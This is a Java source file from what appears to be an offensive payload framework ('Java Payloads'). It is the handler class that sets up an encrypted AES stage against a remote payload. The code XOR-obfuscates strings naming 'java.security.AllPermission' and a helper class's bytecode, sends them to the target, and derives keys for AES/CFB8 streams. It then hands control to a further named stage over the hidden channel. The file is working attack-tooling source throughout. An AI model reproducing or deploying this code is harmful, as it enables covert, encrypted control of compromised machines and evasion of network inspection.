/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl.
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.handler.stage;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Random;

import javapayload.stage.AESHelper;
import javapayload.stage.StreamForwarder;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AES extends StageHandler {

	public Class[] getNeededClasses() {
		return new Class[] {
				javapayload.stage.Stage.class,
				javapayload.stage.AES.class
		};
	}

	protected void handleStreams(DataOutputStream out, InputStream in, String[] parameters) throws Exception {
		SecureRandom sr = new SecureRandom();
		long seed = sr.nextLong();
		Random r = new Random(seed);
		out.writeLong(seed);
		byte[] stringBytes = "file:///,go,java.security.Permissions,java.security.AllPermission,[Ljava.lang.Object;".getBytes("UTF-8");
		out.writeShort(stringBytes.length ^ r.nextInt(65536));
		out.write(encode(r, stringBytes));
		final InputStream classStream = StageHandler.class.getResourceAsStream("/" + AESHelper.class.getName().replace('.', '/') + ".class");
		final ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(classStream, baos);
		final byte[] clazz = baos.toByteArray();
		out.writeShort(clazz.length ^ r.nextInt(65536));
		out.write(encode(r, clazz));
		DataInputStream din = new DataInputStream(in);
		String[] newParameters = (String[]) parameters.clone();
		String key = null, stage = null;
		for (int i = 0; i < parameters.length - 3; i++) {
			if (parameters[i].equals("--") && parameters[i + 1].equals("AES")) {
				key = parameters[i + 2];
				stage = parameters[i + 3];
				newParameters[i] = "AES";
				newParameters[i + 1] = key;
				newParameters[i + 2] = "--";
				break;
			}
		}
		StageHandler stageHandler = (StageHandler) Class.forName("javapayload.handler.stage." + stage).newInstance();
		byte[] outIV = new byte[16];
		sr.nextBytes(outIV);
		out.write(encode(r, outIV));
		out.flush();
		byte[] inIV = new byte[16];
		din.readFully(inIV);
		inIV = encode(r, inIV);
		MessageDigest md5 = MessageDigest.getInstance("MD5");
		md5.update(key.getBytes());
		byte[] rbytes = new byte[32];
		r.nextBytes(rbytes);
		byte[] keyBytes = md5.digest(rbytes);
		Cipher co = Cipher.getInstance("AES/CFB8/NoPadding");
		co.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(outIV), sr);
		Cipher ci = Cipher.getInstance("AES/CFB8/NoPadding");
		ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(inIV), sr);
		stageHandler.consoleIn = consoleIn;
		stageHandler.consoleOut = consoleOut;
		stageHandler.consoleErr = consoleErr;
		stageHandler.handle(new CipherOutputStream(out, co), new CipherInputStream(din, ci), newParameters);
	}

	private byte[] encode(Random r, byte[] bytes) {
		bytes = (byte[]) bytes.clone();
		for (int i = 0; i < bytes.length; i++) {
			bytes[i] ^= r.nextInt(256);
		}
		return bytes;
	}

	protected StageHandler createClone() {
		return new AES();
	}
}
